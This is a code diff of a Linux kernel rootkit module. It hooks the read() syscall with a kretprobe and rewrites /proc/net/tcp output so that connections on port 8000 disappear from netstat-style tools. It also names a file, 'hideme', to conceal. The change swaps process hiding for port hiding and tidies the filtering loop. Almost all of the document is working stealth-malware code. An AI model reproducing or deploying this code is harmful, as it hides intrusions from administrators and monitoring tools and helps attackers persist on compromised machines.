@@ -15,7 +15,7 @@
 
 /// const file name to hide
 const char* hide_file_name = "hideme";
-const pid_t hide_pid = 3015;
+const int port_to_hide = 8000;
 
 
 typedef bool (*entry_filter_t)(struct linux_dirent64*, void* data);
@@ -107,11 +107,8 @@ static int read_handle_entry(struct kretprobe_instance *ri, struct pt_regs *regs
 
 static int read_handle_return(struct kretprobe_instance *ri, struct pt_regs *regs)
 {
-    static rwlock_t tasklist_lock;
-
     struct read_arguments* args = (struct read_arguments*) ri->data;
     unsigned long buffer_count = regs_return_value(regs);
-
 
     // filter socket
     char fd_path[256];
@@ -122,95 +119,55 @@ static int read_handle_return(struct kretprobe_instance *ri, struct pt_regs *reg
 
     struct super_block* sb= file->f_path.mnt->mnt_sb;
 
-    if(strcmp(sb->s_id, "devtmpfs") == 0)
-        return 0;
-    if(strcmp(sb->s_id, "anon_inodefs") == 0)
-        return 0;
-
-    // if(strcmp(path, "/kmsg") == 0 && ( strcmp(sb->s_id, "proc") == 0))
-    //     return 0;
-
-//    pr_info("read (fd=%d, buffer=%ld, count=%d) = %ld\n", args->fd, (unsigned long) args->buffer_ptr, args->count, buffer_count);
-//    pr_info("path=%s, sb=%s\n", path, sb->s_id);
-
-//    pr_info("locking..\n");
-    read_lock(&tasklist_lock);
-    struct pid* pid = find_vpid(hide_pid);
-
-//    pr_info("found pid.. is null %d\n", pid == NULL);
-    struct task_struct* process_to_hide = pid_task(pid, PIDTYPE_PID);
-//    pr_info("found task.. is null=%d\n", process_to_hide == NULL);
-    atomic_t open_fds = process_to_hide->files->count;
-
-//    pr_info("unlocking..\n");
-    read_unlock(&tasklist_lock);
-
     // pr_info("read (fd=%d, buffer=%ld, count=%d) = %ld\n", args->fd, (unsigned long) args->buffer_ptr, args->count, buffer_count);
     // pr_info("path=%s, sb=%s, name=%s, open_fds=%ld\n", path, sb->s_id, process_to_hide->comm, open_fds);
 
+    // do not intercept read syscall with 0 return value 
+    // this means end of file reached
     if(buffer_count == 0)
         return 0;
 
-    if(strcmp(sb->s_id, "proc") == 0){
-        if(ends_with(path, "/net/tcp")){
 
-            int index = -1;
-            unsigned long address = -1;
-            unsigned short port = -1;
+    // intercepting only /proc/net/tcp or /proc/pid/net/tcp
+    if(strcmp(sb->s_id, "proc") == 0 && ends_with(path, "/net/tcp")){
+        int index = -1;
+        unsigned long address = -1;
+        unsigned short port = -1;
 
-            char* row_start = args->buffer_ptr;
-            int new_length = 0;
-            for(int row = 0; *row_start != '\0' ; row++){
-                pr_info("Row Index %d len: %d\n", row, new_length);
+        char* row_start = args->buffer_ptr;
+        int new_length = 0;
+        for(int row = 0; *row_start != '\0' ; row++){
+            int row_length = 0;
 
-                int row_length = 0;
+            // go to end of line
+            while(*(row_start + row_length) != '\n') ++row_length;
+            // skip \n
+            ++row_length;
 
-                // go to end of line
-                while(*(row_start + row_length) != '\n') ++row_length;
-                // skip \n
-                ++row_length;
-
-                pr_info("Row Len: %d\n", row_length);
-
-                if(row == 0){
-                    // first-row copy
-                    new_length += row_length;
-                } else {
-                    int result = sscanf(row_start, "%d: %lX:%hX", &index, &address, &port);
-                    
-                    if(result == 3){
-                        // in regular row
-                        if(port != 8000){
-                            pr_info("Coping index %d address %X port %d\n", index, address, port);
-                            strncpy(args->buffer_ptr + new_length, row_start, row_length);
-                            new_length += row_length;
-                        }  else{
-                            pr_info("Filtering index %d address %X port %d\n", index, address, port);
-                        }      
-                    } else{
-                        pr_warn("Cant Parse line \n");
+            if(row == 0){
+                // "Skip" first row
+                new_length += row_length;
+            } else {
+                int result = sscanf(row_start, "%d: %lX:%hX", &index, &address, &port);
+                
+                if(result == 3){
+                    // writes line sequentially except line to hide, 
+                    // so when line needs to be hidden it will be overriden or ignore with the new length
+                    if(port != port_to_hide){
+                        strncpy(args->buffer_ptr + new_length, row_start, row_length);
                         new_length += row_length;
-                    }
+                    }  
+                } else{
+                    pr_warn("Cant Parse line \n");
+                    new_length += row_length;
                 }
-
-                row_start += row_length;
             }
-            // char* s = (((char*) args->buffer_ptr) + new_length);
-            // pr_info("new_length=%d last_c=%X current_c=%X, last=%s\n", new_length, *(s-1) ,*s, s);
-            // *s = '\0';
-            // *(s+1) = '\0';
 
-            // mark the end of string 
-            // {
-            //     int count = args->count - new_length;
-            //     memset(args->buffer_ptr + new_length, '\0', count);
-            // }
-
-            regs_set_return_value(regs, new_length);            
-            //pr_info("cybering read(fd=%d, buffer=%ld, count=%d) = %ld\n", args->fd, (unsigned long) args->buffer_ptr, args->count, buffer_count);
-            //pr_info("path=%s, sb=%s, name=%s, open_fds=%ld\n", path, sb->s_id, process_to_hide->comm, open_fds);
-            //pr_info("size=%ld, content= %s\n",args->count, args->buffer_ptr);
+            row_start += row_length;
         }
+        
+        // read returns the number of bytes it read
+        regs_set_return_value(regs, new_length);                    
     }
     return 0;
 }
